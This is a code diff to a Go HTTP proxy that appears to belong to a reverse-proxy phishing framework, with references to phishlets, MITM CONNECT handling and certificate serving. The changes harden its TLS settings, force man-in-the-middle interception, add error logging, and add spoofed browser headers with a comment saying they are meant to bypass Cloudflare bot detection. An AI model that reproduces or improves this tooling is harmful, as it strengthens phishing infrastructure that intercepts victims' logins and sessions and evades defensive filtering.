@@ -123,9 +123,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json"},
 	}
 
-	//p.Proxy.Tr.TLSClientConfig.Renegotiation = tls.RenegotiateNever
-	//p.Proxy.Tr.TLSClientConfig.MinVersion = tls.VersionTLS12
-	//p.Proxy.Tr.TLSClientConfig.MaxVersion = tls.VersionTLS13
+	p.Proxy.Tr.TLSClientConfig.Renegotiation = tls.RenegotiateNever
+	p.Proxy.Tr.TLSClientConfig.MinVersion = tls.VersionTLS12
+	p.Proxy.Tr.TLSClientConfig.MaxVersion = tls.VersionTLS13
+	p.Proxy.Tr.TLSClientConfig.PreferServerCipherSuites = true
+	p.Proxy.Tr.TLSClientConfig.CipherSuites = []uint16{
+		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+	}
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
@@ -156,7 +165,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		p.Proxy.ServeHTTP(w, req)
 	})
 
-	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+	//p.Proxy.OnRequest().HandleConnect(goproxy.MitmConnect)
+	p.Proxy.OnRequest().HandleConnectFunc(func(host string, ctx *goproxy.ProxyCtx) (*goproxy.ConnectAction, string) {
+		return goproxy.MitmConnect, host
+	})
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
@@ -172,6 +184,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+			// Add headers to bypass Cloudflare bot detection
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36")
+			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+			req.Header.Set("Connection", "keep-alive")
+			req.Header.Set("Upgrade-Insecure-Requests", "1")
 
 			// handle proxy headers
 			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
@@ -1571,7 +1591,23 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			port, _ = strconv.Atoi(parts[1])
 		}
 
-		tls_cfg := &tls.Config{}
+		//tls_cfg := &tls.Config{}
+		tls_cfg := &tls.Config{
+			Renegotiation: tls.RenegotiateNever, // Disable renegotiation
+			MinVersion:    tls.VersionTLS12,     // Enforce TLS 1.2 or higher
+			MaxVersion:    tls.VersionTLS13,     // Support up to TLS 1.3
+			// Prefer modern cipher suites to avoid server compatibility issues
+			PreferServerCipherSuites: true,
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			},
+			ServerName: hostname,
+		}
 		if !p.developer {
 
 			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
@@ -1683,11 +1719,13 @@ func (p *HttpProxy) httpsWorker() {
 
 			tlsConn, err := vhost.TLS(c)
 			if err != nil {
+				log.Error("TLS handshake error for %s: %s", c.RemoteAddr().String(), err)
 				return
 			}
 
 			hostname := tlsConn.Host()
 			if hostname == "" {
+				log.Error("Empty hostname in TLS connection from %s", c.RemoteAddr().String())
 				return
 			}
 
@@ -1714,6 +1752,21 @@ func (p *HttpProxy) httpsWorker() {
 	}
 }
 
+// Helper function to log TLS version
+func tlsVersionToString(version uint16) string {
+	switch version {
+	case tls.VersionTLS10:
+		return "TLS 1.0"
+	case tls.VersionTLS11:
+		return "TLS 1.1"
+	case tls.VersionTLS12:
+		return "TLS 1.2"
+	case tls.VersionTLS13:
+		return "TLS 1.3"
+	default:
+		return "Unknown"
+	}
+}
 func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
